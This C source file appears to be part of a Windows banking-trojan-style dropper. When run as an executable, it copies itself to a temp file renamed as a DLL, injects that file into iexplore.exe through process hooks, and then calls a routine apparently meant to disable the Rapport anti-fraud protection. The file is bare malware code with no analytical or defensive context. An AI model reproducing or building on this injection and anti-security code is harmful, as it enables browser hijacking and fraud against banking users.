#include <windows.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include "ntdll.h"

#include "utilsu.h"
#include "injntdll.h"
#include "antirapport.h"

VOID DropperExeWork(LPCSTR lpExePath)
{
	CHAR chTempPath[MAX_PATH];
	CHAR chTempName[MAX_PATH];
	
	GetTempPath(RTL_NUMBER_OF(chTempPath)-1, chTempPath);
	GetTempFileName(chTempPath, NULL, 0, chTempName);

	PathRemoveExtension(chTempName);
	PathAddExtension(chTempName, ".dll");

	if (CopyFile(lpExePath, chTempName, FALSE))
	{
		if (UtiSetFileDllFlag(chTempName))
		{
			DWORD dwInj = 0;

			if (InjnProcDllHook("iexplore.exe", chTempName, &dwInj))
			{
				InjnProcDllHook("iexplore.exe", chTempName, &dwInj);

				UtiDPrint(__FUNCTION__"(): InjnProcDllInject ok\n");
			}
			else
			{
				UtiDPrint(__FUNCTION__"(): InjnProcDllInject fails\n");
			}
		}
	}
	else
	{
		UtiDPrint(__FUNCTION__"(): CopyFile fails; last error: %x\n", GetLastError());
	}
}

DWORD MainThread(PVOID)
{
	InjnProcDllUnhook();
	AntiRapStart();
	
	return 0;
}

BOOL g_bDll = FALSE;

BOOL Entry(HMODULE hDll, DWORD dwReasonForCall, DWORD dwReserved)
{
	BOOL bRet = FALSE;
	CHAR chExePath[MAX_PATH];

	GetModuleFileName(NULL, chExePath, RTL_NUMBER_OF(chExePath)-1);
	
	if (hDll && dwReasonForCall == DLL_PROCESS_ATTACH)
	{
		g_bDll = TRUE;

		UtiDPrint(__FUNCTION__"(): Dll: %x\n", hDll);

		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainThread, NULL, 0, NULL);
		if (hThread) CloseHandle(hThread);

		bRet = TRUE;
	}
	else if (!g_bDll)
	{
		DbgPrint(__FUNCTION__"(): Exe: '%s'\n", chExePath);

		DropperExeWork(chExePath);

		ExitProcess(ERROR_SUCCESS);
	}

	return bRet;
}
